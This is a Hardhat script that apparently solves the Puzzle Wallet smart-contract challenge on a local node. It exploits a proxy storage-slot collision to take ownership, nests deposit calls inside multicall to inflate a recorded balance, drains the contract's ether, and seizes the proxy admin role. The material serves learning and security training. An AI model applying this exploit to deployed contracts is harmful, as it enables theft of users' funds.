import { ethers } from "hardhat";

//Fit player and admin addresses chosen from hardhat node addresses 
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const ADMIN = "0x2546bcd3c84621e976d8185a91a922ae77ecec30";

async function main() {

const signer = await ethers.getSigner(ADMIN);
const contractFactory = await ethers.getContractFactory("PuzzleWallet",signer);
const contract = await contractFactory.deploy()

//Encoding init function from implementation to run init() when deploying the proxy. 
const ABI = ["function init(uint256 _maxBalance)", "function setMaxBalance(uint256 _maxBalance)", "function deposit() payable" , "function addToWhitelist(address addr)", "function execute(address to, uint256 value, bytes calldata data) payable", "function multicall(bytes[] calldata data) payable"];
const iface = new ethers.utils.Interface(ABI);
const calldata = iface.encodeFunctionData("init", [0x12435221]);

const proxyContractFactory = await ethers.getContractFactory("PuzzleProxy", signer);
const proxy = await proxyContractFactory.deploy(ADMIN,contract.address,calldata);
const proxiedPW = await contractFactory.attach(proxy.address)

//Set initial contract balance as challenge. 
await proxiedPW.addToWhitelist(ADMIN);
await proxiedPW.deposit({value: ethers.utils.parseEther("0.001")});

//HACK STEPS (Become admin (player))
//All previous txs are being signed by ADMIN account, as it can be checked in the first step. 
//These contracts follow a Transparent proxy structure, but they have a flagrant fault which is storage
//layout collision. So slots 0 and 1 from proxy and those from implementation, are pointing to the same key in storage. 
//Firstly, we'll take advantage of that and become owner to go on with the hack. 
//Once whitelisted, we will have to trick accountance from contract. (initial balance: 0.001 eth).
//With multicall, we can achieve having more in our balance[msg.sender], that the overall contract balance, 
//but not as easy as sending the encode data of deposit twice. We have to encapsulate the deposit in a 
//multicall call itself. Afterwards, we can drain the contract and set our player address as admin.  

// 1. Check the starting values
console.log("Puzzle Wallet owner", await proxiedPW.owner())
console.log("Proxy admin", await proxy.admin())
console.log("Proxy pendingAdmin", await proxy.pendingAdmin())
console.log("Is admin in the WL?", await proxiedPW.whitelisted(ADMIN))
console.log("Is player in the WL?", await proxiedPW.whitelisted(PLAYER_ADDRESS))
console.log("Total balance of Puzzle Wallet", await ethers.provider.getBalance(proxiedPW.address))
console.log("Balances of owner (Puzzle Wallet)", await proxiedPW.balances(ADMIN))
console.log("-----------------")

// 2. Become owner of Puzzle Wallet
const player = await ethers.getSigner(PLAYER_ADDRESS)
await proxy.connect(player).proposeNewAdmin(PLAYER_ADDRESS)
console.log("Puzzle Wallet owner", await proxiedPW.owner())
console.log("Proxy admin", await proxy.admin())
console.log("Proxy pendingAdmin", await proxy.pendingAdmin())
console.log("Is admin in the WL?", await proxiedPW.whitelisted(ADMIN))
console.log("Is player in the WL?", await proxiedPW.whitelisted(PLAYER_ADDRESS))
console.log("Total balance of Puzzle Wallet", await ethers.provider.getBalance(proxiedPW.address))
console.log("Balances of owner (Puzzle Wallet)", await proxiedPW.balances(PLAYER_ADDRESS))
console.log("-----------------")

// 3. Once owner, add player to the whitelist
await proxiedPW.connect(player).addToWhitelist(PLAYER_ADDRESS);
console.log("Is player in the WL?", await proxiedPW.whitelisted(PLAYER_ADDRESS))
console.log("-----------------")

// 4. Trick accounting balance through multicall
const depositData = iface.encodeFunctionData("deposit", []);
const multicallData = iface.encodeFunctionData("multicall", [[depositData]]);
console.log("deposit Data", depositData)
console.log("multicall Data", multicallData)
await proxiedPW.connect(player).multicall([multicallData, multicallData], {value: ethers.utils.parseEther("0.001")});
console.log("Total balance of Puzzle Wallet", await ethers.provider.getBalance(proxiedPW.address))
console.log("Balances of owner (Puzzle Wallet)", await proxiedPW.balances(PLAYER_ADDRESS))
console.log("-----------------")

// 5. Drain balance from contract
await proxiedPW.connect(player).execute(PLAYER_ADDRESS, ethers.utils.parseEther("0.002"), []);
console.log("Total balance of Puzzle Wallet", await ethers.provider.getBalance(proxiedPW.address))
console.log("Balances of owner (Puzzle Wallet)", await proxiedPW.balances(PLAYER_ADDRESS))
console.log("-----------------")

// 6. Set player address as admin
console.log("Proxy admin", await proxy.admin())
await proxiedPW.connect(player).setMaxBalance(PLAYER_ADDRESS)
console.log("Proxy admin", await proxy.admin())
console.log("-----------------")
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
